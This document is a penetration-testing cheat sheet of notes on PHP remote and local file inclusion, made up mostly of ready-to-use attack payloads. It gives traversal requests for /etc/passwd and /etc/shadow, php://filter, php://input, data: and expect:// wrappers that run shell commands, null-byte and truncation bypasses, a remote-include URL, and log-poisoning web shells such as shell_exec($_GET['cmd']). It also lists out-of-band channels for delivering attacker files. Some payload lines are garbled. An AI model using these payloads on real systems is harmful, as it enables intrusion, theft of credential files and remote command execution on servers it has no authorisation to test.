File Inclusion

RFI:
http://url.ext/file.php?vuln=http://192.168.1.10/path/to/file
--test including files at http://127.0.0.1/ for firewall
	--if firewall is found present try connecting to remote hosts over port 53(DNS)
--in php.ini requires "allow_url_fopen" and "allow_url_include" both set to "on"
--in source look for include($_REQUEST["file"].".php");
	
LFI:
http://url.ext/file.php?vuln=this&parameter=/etc/shadow
http://url.ext/file.php?vuln=this&parameter=../../../../etc/shadow
index.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
*if a suspected lfi vulne fails to return appending a null byte (%00) to target file as the trailing argument in a GET request

Writing to file/file upload
<?file%20=%20=fopen("./lib/file.php","w");fwrite($file,"<?phpinfo()?>");fclose($file);phpinnfo();?>

php://filter/ method
http://url.ext/file.php?vuln=this&parameter=php://filter/convert.base64-encode/resource=index
	-read php stream files
=php?page=expect://ls
=php://filter/read=convert.base64-encode/resource=/etc/passwd
/fi/?page=php://input&cmd=ls
vuln.php?page=php://filter/convert.base64-encode/resource=index.php
	--encoding happens before execution therefore <?php .. ?> tags will not execute
	--curl -s http://$ip/?page=php://filter/convert.base64-encode/resource=index.php | grep -e '[^\ ]\{40,\}' | base64 -d
?page=php://filter/resource=/etc/passwd

Local file execution(or how to spawn mad web shells)
php://wrapper/ method	
http://url.ext/file.php?vuln=this&parameter=data:text/plain,<?php system($_GET['x']); ?>&x=ls
http://url.ext/file.php?vuln=this&parameter=data:text/plain;base64,IaMbASe64encOdED==
php?page=zip://path/to/file.zip%23shell
php?page=tar://path/to/file.tar%23shell
php?page=expect://ls
GET:	=php://input&cmd=ls
		+
POST:	<?php system($_GET[‘cmd’]); ?>
vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd?page=php://filter/resource=/etc/passwd
?page=php://filter/resource=/etc/passwd


NULL BYTE BYPASS TECHNIQUES
vuln.php?page=/etc/passwd%00
vuln.php?page=/etc/passwd%2500

TRUNCATION BYPASS
vuln.php?page=/etc/passwd…………………………………………………………………………….
vuln.php?page=../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
vuln.php?page=/etc/passwd/../../../../../../../../../../../../../../../../../..

SMB
?get=\\server\file.ext
	-connects to remote smb instance defined by hostname in UNC path
	--uncommon
?get=\\127.0.0.1\boot.ini	
	-commonly resolves (ASP/PHP/JSP) UNC path to local filesystem root for smb/cifs
	--e.g. C:\boot.ini

Best practices:
Know which encoding are likely to be interpreted by different languages in different environments.
Always escape the directory delimiter, especially on windows, in HTTP GET/POST/PUT parameters slashes are likely to be satanized -esp. in Windows/dotnet- for functional purposes even without any consideration of security.
       --iconv, the standard *nix/gnu enc/decoding utility is ideal for this purpose.

It is occasionally preferable to pivot from an RFI and LFI, more often vice-versa. I wrote a webshell for specifically this pivot to test the many possible techniques available -some by default- to gain LFI in PHP when only an ephemeral RFI (does not touch the filesystem) is otherwise possible within the application context to attempt gaining remote command execution preferable to code execution or reflected client-side script inclusion.
https://github.com/thepacketbender/we shells.git

LFI->RFI usually involves creating a gadget on the target filesystem executed in memory to make an out-of-band request pointing to an attacker-hosted file and service that will be processed or served in code execution on the host.
Ideally the application can be induced to request and store a file.
      --most scripting language file upload functions move uploaded files through temporary storage -rare chance to race condition for it- and rename the file in arbitrary and long conventions at a storage location; often the resulting file name/location is not returned in a visible portion of the response body, save for within administrative panels. If the final name of the stored file is not reflected in a response and directory browsing is not possible this may take considerable brute forcing -significantly less if the naming convention is standard to a public library- to discover and even then may not be served in a mime type or with a file extension that will be executed by the application server. 

In the last case noted above it is occasionally possible to preserve the filetype of a directory configuration file that has been uploaded (e.g. .htaccess, .ini, web.config) where the directives of the configuration file takes precedence (& also must precede the establishment of a file handle on it by the code that has popped a pointer to its temporary file location on the stack, though this should only be the case if its symbolic storage location is already nested within the webroot directory, even then pending the language handling it as a filesystem artifact) the privileged imperative of the naming schema conversion function to modify the created file on the target host.

Out-Of-Band file transfer:
      --Know where your file is landing and what it or any link to it will be named for reference.
SMTP/SMTPS/web email (check the MX record first, but the contact or about pages are great sources for these if SMTP/RTCP are not enumerable).
File shares (SMB/AFP/NFS)
Network-based distribution systems
FTP/TFTP/SFTP/SCP
SNMP
DNS
Database entry
Log Poisoning (host/network-based, esp. Splunk, web server access/error logs and syslog)
s3/cloud blob storage buckets
cloud logging utilities
memcached?
Redis?
NAS
CORS misconfiguration
Glassfish/Tomcat/Jenkins
Java RMI
WinRM
	



TODO
/zip/tar file read/write methods
Log poisoning
	<?php echo shell_exec($_GET['cmd']);?>
Files to target
	*nix
		/proc/self/environ
		/proc/self/fd/#
			0,1,2==stdin,stdout,stderr
			3-100 can be brute forced to read any open files
			-include malicious php in user agent
		/proc/self/cmdline
			-not exploitable for code execution, but may be used to locate sensative files on server
PHP session files
	see sans642.1 p.93
Fuzzing
	/fuzzdb/dict/BURP-PayLoad/LFI/
Links
https://highon.coffee/blog/lfi-cheat-sheet/
https://www.owasp.org/index.php/PHP_File_Inclusion
http://www.securityidiots.com/Web-Pentest/LFI/
